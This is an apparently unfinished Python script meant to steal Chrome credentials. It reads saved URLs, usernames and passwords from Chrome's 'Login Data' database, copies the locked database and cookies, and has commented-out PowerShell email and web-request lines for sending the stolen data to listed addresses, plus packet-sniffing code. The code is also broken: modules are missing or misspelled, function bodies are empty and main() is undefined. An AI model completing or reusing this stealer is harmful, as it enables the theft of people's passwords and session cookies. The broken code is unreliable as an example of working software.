#!/usr/bin/python
#!/usr/bin/python3
#!/usr/bin/env python
#!/usr/bin/env python3
#!/#path/#to/#python

# -*- coding: utf8 -*-
# date                 :- 19/03/2015
# author               :- Md Jabed Ali(jabed)

import os
from os import getenv
import sys
#import sqlite3
import csv
import json
import argparse
#import win32crypt
#from env import
import requests
import hashlib
from itertools import starmap
from shutil import copyfile
import smpt
import pyshark
import shutil
import zipfile
from glob import glob
from pathlib import Path

# check if chrome exists.
def path_chrome():
    if os.name == "nt":
        Name = os.getenv('localappdata') + "\\Google\\Chrome\\User Data\\Default\\" # windws Path
        print(Name)
    elif os.name == " ": 
        Name = os.getenv('HOME')
        if sys.platform == " ":
            Name += '/Library/Application Support/Google/Chrome/Default/' # os Path
            print(Name)
        else:
            Name += '/.config/google-chrome/Default/' # linux Path
            print(Name)
    if not os.path.isdir(Name):
        #print'There is no Chrome / Chrome dosen''t exists.'
        print('There is no Chrome / Chrome dosen''t exists.')
        sys.exit(0)
    return Name

# connect to the Database
def lgingdb():
    try:
        conn = sqlite3.connect(getenv("APPDATA") + "/../Local/Google/Chrome/User Data/Default/Login Data")
        cursor = conn.cursor()
        #os.sys(taskkill /im chrome.exe)
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        data = cursor.fetchall()
        sys.exit(1)
    except sqlite3.OperationalError as e:
        e = str(e)
        if e == 'database is locked':
            #print'Google Chrome is open in the background'
            print('Google Chrome is open in the background')
        #elif:
        else:
            print(e)
        sys.exit(0)    

# for locked database.
def lockdb():
    temp_path = tempfile.mkdtemp()
    with open(getenv("APPDATA") + "/../Local/Google/Chrome/User Data/Default/Login Data", 'r') as content:
        dbcopy = content.read()
    with open('{}/chrome'.format(temp_path), 'w') as content:
        content.write(dbcopy)
    database = sqlite3.connect(temp_path)
    sys.exit(0) 

# for current session.


# for zipping.
def zipping():
    #Cookies = 'cookies.zip'
    # that will create a 'Zip' in the present working directory.
    # 
    #with zipfile.ZipFile(Cookies, 'w') as file:
    #print("{} is created.".format(archive_name))
    #os.system("powershell Copy-Item -Path \"C:\Users\Jabbir\AppData\Local\Google\Chrome\User Data\Default\*\" -Force -PassThru | Get-ChildItem | Compress-Archive -DestinationPath \"C:\Users\Jabbir\"")
    #Cookies = os.getenv("APPDATA") + "/../Local/Google/Chrome/User Data/Default/Login Data"
    #shutil.make_archive(Name,'zip', os.getenv('localappdata') + ("\\Google\\Chrome\\User Data\\Default\\"))
    #sys.exit(0)

# send/upload to server. (jabed.akcc@gmail.com / javed.akcc1@gmail.com / root@. )
def send_data():
    #os.system("powershell Invoke-RestMethod -Uri \"-\" -Method 'Post' -Body $body -ContentType \"-\" -Headers $header")
    # Invoke-WebRequest -Uri ".com" -UseBasicParsing
    # gmail/yahoo initial.
    # $smptprt = "587" / "465"
    #os.system("powershell $smptprt = \"587\" | $Frm = \"@gmail.com\" | ...... | Send-MailMessage -From $Frm -to $To -Cc $Cc -Subject $Sub -Body $html -SmtpServer $SMTPServer -port $smptprt -UseSsl -Credential (Get-Credential) -Attachments $Attamnt –DeliveryNotificationOption OnSuccess")
    #os.system("powershell Send-MailMessage -From $Frm -to $To -Cc $Cc -Subject $Sub -Body $html -SmtpServer $SMTPServer -port $smptprt -UseSsl -Credential (Get-Credential) -Attachments $Attamnt –DeliveryNotificationOption OnSuccess")
    #sys.exit(0)

# forwding tcp.
def tcp_frwdng:

# listing.
def lsting():

    
# sniffing.
def sniff():
    sniff_eth = pyshark.LiveCapture(interface='eth0')
    # recursively 
    readingcaprd = pyshark.FileCapture('../bin/*.cap', decryption_key=' ') 
    #capture = pyshark.RemoteCapture('192.168.1.130', 'eth0') # remote host.
    capture.sniff(timeout=10)

#copyfile(getenv("APPDATA") + "/../Local/Google/Chrome/User Data/Default/Cookies", './Cookies') # copy cookies.

if __name__ == '__main__':
    main()
    
